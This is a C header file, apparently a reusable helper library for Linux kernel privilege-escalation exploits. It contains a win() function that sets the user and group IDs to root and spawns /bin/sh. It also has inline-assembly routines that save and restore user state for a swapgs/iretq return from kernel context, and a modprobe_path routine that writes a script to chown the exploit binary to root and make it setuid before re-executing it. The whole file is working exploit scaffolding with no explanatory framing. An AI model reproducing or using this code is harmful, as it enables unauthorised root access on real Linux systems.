#ifndef _COMMON_H
#define _COMMON_H

#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>


typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;
typedef int64_t  s64;
typedef int32_t  s32;
typedef int16_t  s16;
typedef int8_t   s8;


u64 kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((u64)(addr) - 0xffffffff81000000 + kernel_base)


void fatal (const char* msg) {
    perror(msg);
    exit(-1);
}


void x64dump(void *buf, u32 num) {
    u64 *buf64 = (u64*)buf;
    printf("[--dump--] start\n");
    for (u32 i = 0; i < num; i++) {
        if (i%2 == 0) {
            printf("%p: ", &buf64[i]);
        }
        printf("0x%016lx    ",buf64[i]);
        if (i%2 == 1 && i+1 != num) {
            printf("\n");
        }
    }
    printf("\n[--dump--] end\n");
}


static void win() {
    setuid(0);
    setgid(0);
    if (getuid() != 0) {
        puts("[-] not root");
        exit(-1);
    }
    puts("[+] win!");
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);
    fatal("execve");
}


u64 user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
    asm(
        "mov %0, cs\n"
        "mov %1, ss\n"
        "mov %2, rsp\n"
        "pushf\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

void restore_state() {
    asm volatile(
        "swapgs\n"
        "mov qword ptr [rsp+0x20], %0\n"
        "mov qword ptr [rsp+0x18], %1\n"
        "mov qword ptr [rsp+0x10], %2\n"
        "mov qword ptr [rsp+0x08], %3\n"
        "mov qword ptr [rsp+0x00], %4\n"
        "iretq\n"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(win));
}

char dummy_path[0x100];
char exe_path[0x100];
void setup_modprobe(const char *dir) {
    int fd;

    if (getenv("modprobe") != NULL)
        win();

    // Get exploit file path
    readlink("/proc/self/exe", exe_path, sizeof(exe_path));

    // Create modprobe target
    snprintf(dummy_path, sizeof(dummy_path), "%s/x", dir);
    fd = open(dummy_path, O_CREAT|O_WRONLY, 0777);
    if (fd < 0)
        fatal("setup_modprobe open");
    dprintf(fd, "#!/bin/sh\nchown +0:+0 '%1$s' || chown root:root '%1$s'\nchmod u+s '%1$s'\n", exe_path);
    close(fd);

    // Create dummy file
    snprintf(dummy_path, sizeof(dummy_path), "%s/dummy", dir);
    fd = open(dummy_path, O_CREAT|O_WRONLY, 0777);
    if (fd < 0)
        fatal("setup_modprobe open");
    write(fd, "\xff\xff\xff\xff", 4);
    close(fd);
}

void execute_modprobe() {
    // Trigger modprobe_path
    system(dummy_path);

    char *argv[] = { exe_path, NULL };
    char *envp[] = { "modprobe=1", NULL };
    execve(exe_path, argv, envp);
    fatal("execve");
}


void assign_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset) != 0)
        fatal("assign_to_core");
}

void thread_assign_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0)
        fatal("thread_assign_to_core");
}

#endif
